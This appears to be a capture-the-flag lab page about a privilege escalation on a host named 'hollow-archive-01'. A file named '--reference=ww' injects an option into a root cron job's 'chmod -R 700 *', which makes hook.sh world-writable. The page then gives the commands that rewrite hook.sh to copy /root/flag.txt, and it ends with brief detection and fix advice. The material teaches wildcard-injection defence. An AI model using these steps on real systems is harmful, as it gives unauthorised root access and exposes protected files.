# C06 · Station D — chmod --reference · ★★★☆

> **Chapter:** [[Chapter-06-Overview]] · **Next:** [[Chapter-07-Overview]]
> **Host:** `hollow-archive-01` (`target-wild`) · **Job:** `chmod -R 700 * ; bash hook.sh` in `/opt/conf` (sticky `1777`)
> **The bug:** `--reference=FILE` makes `chmod` copy FILE's mode, overriding `700`.

---

## 1. Exploit — do this first

```bash
cd /opt/conf
touch ww && chmod 666 ww
touch -- "--reference=ww"
# tick 1: chmod sets hook.sh to 0666 (watch: stat -c %a hook.sh)
echo 'cp /root/flag.txt /tmp/flag; chmod 644 /tmp/flag' > /opt/conf/hook.sh
# tick 2: the job runs YOUR hook.sh as root
cat /tmp/flag
```

---

## 2. How you find it

```bash
cat /usr/local/sbin/conf-run.sh   # chmod -R 700 * ; bash hook.sh
ls -ld /opt/conf                  # drwxrwxrwt — sticky
ls -l /opt/conf/hook.sh           # root:root 0700 — can't read or edit
```

## 3. Why it works

`hook.sh` is `0700` and sticky-protected, so you can't touch it. `--reference=ww`
(your `0666` file) overrides the `700`, making `hook.sh` world-writable. Now you
write it even without owning it; the next tick runs your content as root. Same
two-step as Station C: **open the mode**, then **rewrite and wait**.

## 4. Pitfalls

- `--reference=ww` must be a relative name in the dir (no `/`).
- `ww` must be the mode you want applied (0666), not the default.

## 5. Detect & fix

- **Detect / Fix:** identical to Station C — ban bare `*` in privileged `chmod`/`chown`, keep root executables out of user-writable dirs. [[Blue-Team-Playbook]].

## 6. What you learned

- Mode and ownership are both wildcard-injectable; pair with the sticky-bit insight from C.

> Next chapter: [[Chapter-07-Overview]] · Related: [[C06-Station-C-chown-reference]]
